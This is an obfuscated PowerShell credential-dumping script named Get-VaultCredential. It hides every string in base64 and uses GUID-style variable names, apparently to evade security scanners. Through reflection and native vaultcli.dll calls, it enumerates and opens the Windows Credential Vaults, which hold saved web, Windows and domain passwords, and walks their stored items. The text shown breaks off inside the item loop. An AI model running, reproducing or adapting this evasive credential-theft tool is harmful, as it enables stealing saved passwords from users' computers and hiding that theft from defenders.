function Get-VaultCredential
{
    [CmdletBinding()] Param()
    ${1280d28a4cc6471db5b1eef88609e343} = [Environment]::OSVersion.Version
    ${bd40dfe484f544f5ac49b71a65f7b35a} = ${1280d28a4cc6471db5b1eef88609e343}.Major
    ${9cad0d1e6b2e48439dde28800f64a4c9} = ${1280d28a4cc6471db5b1eef88609e343}.Minor
    ${53cbce4b052e4e39a8b63eadcbf809dd} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AFUAdABpAGwA'))))
    ${5e50cb66d1a348a7845c7f446475467d} = [AppDomain]::CurrentDomain.DefineDynamicAssembly(${53cbce4b052e4e39a8b63eadcbf809dd}, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    ${c82ba4aabf1e49a4808fe79eb5673a0c} = ${5e50cb66d1a348a7845c7f446475467d}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AFUAdABpAGwA'))), $False)
    ${6c9cec1398574859bcfc2982421440cc} = ${c82ba4aabf1e49a4808fe79eb5673a0c}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEwAaQBiAC4AVgBBAFUATABUAF8ARQBMAEUATQBFAE4AVABfAFQAWQBQAEUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [Int32])
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGQAZQBmAGkAbgBlAGQA'))), -1)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAG8AbABlAGEAbgA='))), 0)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AcgB0AA=='))), 1)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAHMAaQBnAG4AZQBkAFMAaABvAHIAdAA='))), 2)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQA'))), 3)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAHMAaQBnAG4AZQBkAEkAbgB0AA=='))), 4)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAHUAYgBsAGUA'))), 5)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGkAZAA='))), 6)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA'))), 7)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBBAHIAcgBhAHkA'))), 8)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBTAHQAYQBtAHAA'))), 9)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABlAGMAdABlAGQAQQByAHIAYQB5AA=='))), 10)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUA'))), 11)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQA'))), 12)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdAA='))), 13)
    ${62f0aacddeff4a369deda8333279ef46} = ${6c9cec1398574859bcfc2982421440cc}.CreateType()
    ${6c9cec1398574859bcfc2982421440cc} = ${c82ba4aabf1e49a4808fe79eb5673a0c}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEwAaQBiAC4AVgBBAFUATABUAF8AUwBDAEgARQBNAEEAXwBFAEwARQBNAEUATgBUAF8ASQBEAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [Int32])
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBsAGwAZQBnAGEAbAA='))), 0)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAA=='))), 1)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))), 2)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AG8AcgA='))), 3)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcA'))), 4)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBhAGcAZQBTAGkAZAA='))), 5)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAUwB0AGEAcgB0AA=='))), 100)
    $null = ${6c9cec1398574859bcfc2982421440cc}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAARQBuAGQA'))), 10000)
    ${c25a0c27aa41423b88af4de05ab1b339} = ${6c9cec1398574859bcfc2982421440cc}.CreateType()
    ${007ccd859840494b96bfcd68c4597e38} = [Runtime.InteropServices.StructLayoutAttribute].GetConstructor([Runtime.InteropServices.LayoutKind])
    ${3adf2af46bd2443c91bbee93b83d1e5c} = [Runtime.InteropServices.StructLayoutAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
    ${ab2cc37671a44046bead3b62dcbc031d} = New-Object Reflection.Emit.CustomAttributeBuilder(${007ccd859840494b96bfcd68c4597e38},
                                                                                     @([Runtime.InteropServices.LayoutKind]::Explicit),
                                                                                     ${3adf2af46bd2443c91bbee93b83d1e5c},
                                                                                     @([Runtime.InteropServices.CharSet]::Ansi))
    ${c058e66cd16247278bc23e37ea98c46d} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${2d25dc08941f4c53ab659ba6c06f3f79} = ${c82ba4aabf1e49a4808fe79eb5673a0c}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEwAaQBiAC4AVgBBAFUATABUAF8ASQBUAEUATQA='))), ${c058e66cd16247278bc23e37ea98c46d}, [Object], [System.Reflection.Emit.PackingSize]::Size4)
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEASQBkAA=='))), [Guid], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABzAHoAQwByAGUAZABlAG4AdABpAGEAbABGAHIAaQBlAG4AZABsAHkATgBhAG0AZQA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABSAGUAcwBvAHUAcgBjAGUARQBsAGUAbQBlAG4AdAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABJAGQAZQBuAHQAaQB0AHkARQBsAGUAbQBlAG4AdAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABBAHUAdABoAGUAbgB0AGkAYwBhAHQAbwByAEUAbABlAG0AZQBuAHQA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    if (${bd40dfe484f544f5ac49b71a65f7b35a} -ge 6 -and ${9cad0d1e6b2e48439dde28800f64a4c9} -ge 2)
    {
        $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABQAGEAYwBrAGEAZwBlAFMAaQBkAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    }
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABNAG8AZABpAGYAaQBlAGQA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AEYAbABhAGcAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFAAcgBvAHAAZQByAHQAaQBlAHMAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABQAHIAbwBwAGUAcgB0AHkARQBsAGUAbQBlAG4AdABzAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    ${f2d61ec8abbe45409ddbd8773eb71409} = ${2d25dc08941f4c53ab659ba6c06f3f79}.CreateType()
    ${2d25dc08941f4c53ab659ba6c06f3f79} = ${c82ba4aabf1e49a4808fe79eb5673a0c}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEwAaQBiAC4AVgBBAFUATABUAF8ASQBUAEUATQBfAEUATABFAE0ARQBOAFQA'))), ${c058e66cd16247278bc23e37ea98c46d})
    ${2d25dc08941f4c53ab659ba6c06f3f79}.SetCustomAttribute(${ab2cc37671a44046bead3b62dcbc031d})
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEARQBsAGUAbQBlAG4AdABJAGQA'))), ${c25a0c27aa41423b88af4de05ab1b339}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))).SetOffset(0)
    $null = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA='))), ${62f0aacddeff4a369deda8333279ef46}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))).SetOffset(8)
    ${f95b2aeb23794d24a9cc41fe39510798} = ${2d25dc08941f4c53ab659ba6c06f3f79}.CreateType()
    ${2d25dc08941f4c53ab659ba6c06f3f79} = ${c82ba4aabf1e49a4808fe79eb5673a0c}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEwAaQBiAC4AVgBhAHUAbAB0AGMAbABpAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEMAbABhAHMAcwA='))))
    ${dfbdc08c26294e219dae2251b5705987} = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AE8AcABlAG4AVgBhAHUAbAB0AA=='))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAHUAbAB0AGMAbABpAC4AZABsAGwA'))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([Guid].MakeByRefType(),
                                                                 [UInt32],
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)
    ${dfbdc08c26294e219dae2251b5705987} = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEMAbABvAHMAZQBWAGEAdQBsAHQA'))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAHUAbAB0AGMAbABpAC4AZABsAGwA'))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)
    ${dfbdc08c26294e219dae2251b5705987} = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEYAcgBlAGUA'))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAHUAbAB0AGMAbABpAC4AZABsAGwA'))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr]),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)
    ${dfbdc08c26294e219dae2251b5705987} = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEUAbgB1AG0AZQByAGEAdABlAFYAYQB1AGwAdABzAA=='))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAHUAbAB0AGMAbABpAC4AZABsAGwA'))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([Int32],
                                                                 [Int32].MakeByRefType(),
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)
    ${dfbdc08c26294e219dae2251b5705987} = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEUAbgB1AG0AZQByAGEAdABlAEkAdABlAG0AcwA='))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAHUAbAB0AGMAbABpAC4AZABsAGwA'))),
                                                      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr],
                                                                 [Int32],
                                                                 [Int32].MakeByRefType(),
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)
    if (${bd40dfe484f544f5ac49b71a65f7b35a} -ge 6 -and ${9cad0d1e6b2e48439dde28800f64a4c9} -ge 2)
    {
        ${dfbdc08c26294e219dae2251b5705987} = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEcAZQB0AEkAdABlAG0A'))),
                                                          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAHUAbAB0AGMAbABpAC4AZABsAGwA'))),
                                                          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
                                                          [Reflection.CallingConventions]::Standard,
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                     [Guid].MakeByRefType(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                     [IntPtr].MakeByRefType()),
                                                          [Runtime.InteropServices.CallingConvention]::Winapi,
                                                          [Runtime.InteropServices.CharSet]::Auto)
    }
    else
    {
        ${dfbdc08c26294e219dae2251b5705987} = ${2d25dc08941f4c53ab659ba6c06f3f79}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAHUAbAB0AEcAZQB0AEkAdABlAG0A'))),
                                                          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAHUAbAB0AGMAbABpAC4AZABsAGwA'))),
                                                          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
                                                          [Reflection.CallingConventions]::Standard,
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                     [Guid].MakeByRefType(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                     [IntPtr].MakeByRefType()),
                                                          [Runtime.InteropServices.CallingConvention]::Winapi,
                                                          [Runtime.InteropServices.CharSet]::Auto)
    }
    ${208b5b442263465081f8b114a5784fcf} = ${2d25dc08941f4c53ab659ba6c06f3f79}.CreateType()
    function local:Get-VaultElementValue
    {
        Param (
            [ValidateScript({$_ -ne [IntPtr]::Zero})]
            [IntPtr]
            ${b1e5a2f6c5cb44889f16cdbad453cee8}
        )
        ${9ff8f33cd97542e083bf922c95412118} = [Runtime.InteropServices.Marshal]::PtrToStructure(${b1e5a2f6c5cb44889f16cdbad453cee8}, [Type] ${f95b2aeb23794d24a9cc41fe39510798})
        ${cc958e9142794654b131e8536c2f4fb8} = [IntPtr] (${b1e5a2f6c5cb44889f16cdbad453cee8}.ToInt64() + 16)
        switch (${9ff8f33cd97542e083bf922c95412118}.Type)
        {
            ${62f0aacddeff4a369deda8333279ef46}::String {
                ${8117cf6ab60f426a8bae1c51945fdf90} = [Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr] ${cc958e9142794654b131e8536c2f4fb8})
                [Runtime.InteropServices.Marshal]::PtrToStringUni([IntPtr] ${8117cf6ab60f426a8bae1c51945fdf90})
            }
            ${62f0aacddeff4a369deda8333279ef46}::Boolean {
                [Bool] [Runtime.InteropServices.Marshal]::ReadByte([IntPtr] ${cc958e9142794654b131e8536c2f4fb8})
            }
            ${62f0aacddeff4a369deda8333279ef46}::Short {
                [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr] ${cc958e9142794654b131e8536c2f4fb8})
            }
            ${62f0aacddeff4a369deda8333279ef46}::UnsignedShort {
                [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr] ${cc958e9142794654b131e8536c2f4fb8})
            }
            ${62f0aacddeff4a369deda8333279ef46}::Int {
                [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr] ${cc958e9142794654b131e8536c2f4fb8})
            }
            ${62f0aacddeff4a369deda8333279ef46}::UnsignedInt {
                [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr] ${cc958e9142794654b131e8536c2f4fb8})
            }
            ${62f0aacddeff4a369deda8333279ef46}::Double {
                [Runtime.InteropServices.Marshal]::PtrToStructure(${cc958e9142794654b131e8536c2f4fb8}, [Type] [Double])
            }
            ${62f0aacddeff4a369deda8333279ef46}::Guid {
                [Runtime.InteropServices.Marshal]::PtrToStructure(${cc958e9142794654b131e8536c2f4fb8}, [Type] [Guid])
            }
            ${62f0aacddeff4a369deda8333279ef46}::Sid {
                ${5014340fe373496b8cd8c2eda1b91d68} = [Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr] ${cc958e9142794654b131e8536c2f4fb8})
                Write-Verbose "0x$(${5014340fe373496b8cd8c2eda1b91d68}.ToString('X8'))"
                ${104d037834804cb7beb1454cda7a8b54} = [Security.Principal.SecurityIdentifier] ([IntPtr] ${5014340fe373496b8cd8c2eda1b91d68})
                ${104d037834804cb7beb1454cda7a8b54}.Value
            }
            ${62f0aacddeff4a369deda8333279ef46}::ByteArray { $null }
            ${62f0aacddeff4a369deda8333279ef46}::TimeStamp { $null }
            ${62f0aacddeff4a369deda8333279ef46}::ProtectedArray { $null }
            ${62f0aacddeff4a369deda8333279ef46}::Attribute { $null }
            ${62f0aacddeff4a369deda8333279ef46}::Last { $null }
        }
    }
    ${24c8469bf285440a875de4a34cd79305} = 0
    ${fe1f5f73019a4a60a1693a6969e3c20d} = [IntPtr]::Zero
    ${a75abc70368c44fcbb39ce9edca87f7c} = ${208b5b442263465081f8b114a5784fcf}::VaultEnumerateVaults(0, [Ref] ${24c8469bf285440a875de4a34cd79305}, [Ref] ${fe1f5f73019a4a60a1693a6969e3c20d})
    if (${a75abc70368c44fcbb39ce9edca87f7c} -ne 0)
    {
        throw "Unable to enumerate vaults. Error (0x$(${a75abc70368c44fcbb39ce9edca87f7c}.ToString('X8')))"
    }
    ${a182138fef914c68bf31f8516530b664} = ${fe1f5f73019a4a60a1693a6969e3c20d}
    ${a49e774fea8b4e23905aabb599ed6413} = @{
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgBGADEAQQA2ADUAMAA0AC0AMAA2ADQAMQAtADQANABDAEYALQA4AEIAQgA1AC0AMwA2ADEAMgBEADgANgA1AEYAMgBFADUA')))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQBjAHUAcgBlACAATgBvAHQAZQA=')))
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwBDAEMARAA1ADQAOQA5AC0AOAA3AEEAOAAtADQAQgAxADAALQBBADIAMQA1AC0ANgAwADgAOAA4ADgARABEADMAQgA1ADUA')))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFcAZQBiACAAUABhAHMAcwB3AG8AcgBkACAAQwByAGUAZABlAG4AdABpAGEAbAA=')))
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQA1ADQARQAyADMARAAwAC0AQwA2ADQANAAtADQARQA2AEYALQA4AEMARQA2AC0ANQAwADYAOQAyADcAMgBGADkAOQA5AEYA')))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABQAGkAYwBrAGUAcgAgAFAAcgBvAHQAZQBjAHQAbwByAA==')))
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABCAEYANABDADQANAAyAC0AOQBCADgAQQAtADQAMQBBADAALQBCADMAOAAwAC0ARABEADQAQQA3ADAANABEAEQAQgAyADgA')))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBlAGIAIABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA')))
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NwA3AEIAQwA1ADgAMgBCAC0ARgAwAEEANgAtADQARQAxADUALQA0AEUAOAAwAC0ANgAxADcAMwA2AEIANgBGADMAQgAyADkA')))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA=')))
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQA2ADkARAA3ADgAMwA4AC0AOQAxAEIANQAtADQARgBDADkALQA4ADkARAA1AC0AMgAzADAARAA0AEQANABDAEMAMgBCAEMA')))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEQAbwBtAGEAaQBuACAAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAQwByAGUAZABlAG4AdABpAGEAbAA=')))
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwBFADAARQAzADUAQgBFAC0AMQBCADcANwAtADQAMwBFADcALQBCADgANwAzAC0AQQBFAEQAOQAwADEAQgA2ADIANwA1AEIA')))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEQAbwBtAGEAaQBuACAAUABhAHMAcwB3AG8AcgBkACAAQwByAGUAZABlAG4AdABpAGEAbAA=')))
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwBDADgAOAA2AEYARgAzAC0AMgA2ADYAOQAtADQAQQBBADIALQBBADgARgBCAC0AMwBGADYANwA1ADkAQQA3ADcANQA0ADgA')))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEUAeAB0AGUAbgBkAGUAZAAgAEMAcgBlAGQAZQBuAHQAaQBhAGwA')))
        ([Guid] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA')))) = $null
    }
    if (${24c8469bf285440a875de4a34cd79305})
    {
        foreach ($i in 1..${24c8469bf285440a875de4a34cd79305})
        {
            ${fee04732c23a47ecacf759098477b7c2} = [Runtime.InteropServices.Marshal]::PtrToStructure(${a182138fef914c68bf31f8516530b664}, [Type] [Guid])
            ${a182138fef914c68bf31f8516530b664} = [IntPtr] (${a182138fef914c68bf31f8516530b664}.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] [Guid]))
            ${34c503abdf824ff9bb9e662b1da95cf4} = [IntPtr]::Zero
            Write-Verbose "Opening vault - $(${a49e774fea8b4e23905aabb599ed6413}[${fee04732c23a47ecacf759098477b7c2}]) ($(${fee04732c23a47ecacf759098477b7c2}))"
            ${a75abc70368c44fcbb39ce9edca87f7c} = ${208b5b442263465081f8b114a5784fcf}::VaultOpenVault([Ref] ${fee04732c23a47ecacf759098477b7c2}, 0, [Ref] ${34c503abdf824ff9bb9e662b1da95cf4})
            if (${a75abc70368c44fcbb39ce9edca87f7c} -ne 0)
            {
                Write-Error "Unable to open the following vault: $(${a49e774fea8b4e23905aabb599ed6413}[${fee04732c23a47ecacf759098477b7c2}]). Error (0x$(${a75abc70368c44fcbb39ce9edca87f7c}.ToString('X8')))"
                continue
            }
            ${d55006db11114242a5777a6348d5bbd5} = 0
            ${3422e1ed3b09486bb38afaf666e5f736} = [IntPtr]::Zero
            ${a75abc70368c44fcbb39ce9edca87f7c} = ${208b5b442263465081f8b114a5784fcf}::VaultEnumerateItems(${34c503abdf824ff9bb9e662b1da95cf4}, 512, [Ref] ${d55006db11114242a5777a6348d5bbd5}, [Ref] ${3422e1ed3b09486bb38afaf666e5f736})
            if (${a75abc70368c44fcbb39ce9edca87f7c} -ne 0)
            {
                $null = ${208b5b442263465081f8b114a5784fcf}::VaultCloseVault([Ref] ${34c503abdf824ff9bb9e662b1da95cf4})
                Write-Error "Unable to enumerate vault items from the following vault: $(${a49e774fea8b4e23905aabb599ed6413}[${fee04732c23a47ecacf759098477b7c2}]). Error (0x$(${a75abc70368c44fcbb39ce9edca87f7c}.ToString('X8')))"
                continue
            }
            ${4d7c47515f0b42e788329f442342706c} = ${3422e1ed3b09486bb38afaf666e5f736}
            if (${d55006db11114242a5777a6348d5bbd5})
            {
                foreach ($j in 1..${d55006db11114242a5777a6348d5bbd5})
                {
